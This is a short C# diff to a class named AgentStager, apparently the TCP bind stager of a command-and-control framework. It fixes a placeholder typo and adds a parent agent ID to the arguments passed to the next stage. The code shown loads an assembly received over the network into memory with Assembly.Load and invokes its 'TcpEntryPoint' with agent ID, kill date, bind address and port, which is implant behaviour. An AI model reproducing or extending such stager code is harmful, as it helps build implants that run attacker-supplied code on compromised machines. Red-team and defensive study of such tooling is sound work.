@@ -8,7 +8,7 @@ class AgentStager
 
     static string AgentID;
 
-    static readonly string BindAddress = "<<BindAddress>";
+    static readonly string BindAddress = "<<BindAddress>>";
     static readonly int BindPort = int.Parse("<<BindPort>>");
     static readonly DateTime KillDate = DateTime.Parse("<<KillDate>>");
 
@@ -51,12 +51,15 @@ class AgentStager
                         var asm = Assembly.Load(message.Data.Data);
                         var type = asm.GetType("AgentStage");
                         var instance = Activator.CreateInstance(type);
+
+                        var parentID = commModule.GetParentID();
+
                         type.InvokeMember(
                             "TcpEntryPoint",
                             BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                             null,
                             instance,
-                            new object[] { AgentID, KillDate, BindAddress, BindPort });
+                            new object[] { AgentID, parentID, KillDate, BindAddress, BindPort });
                     }
                 }
             }
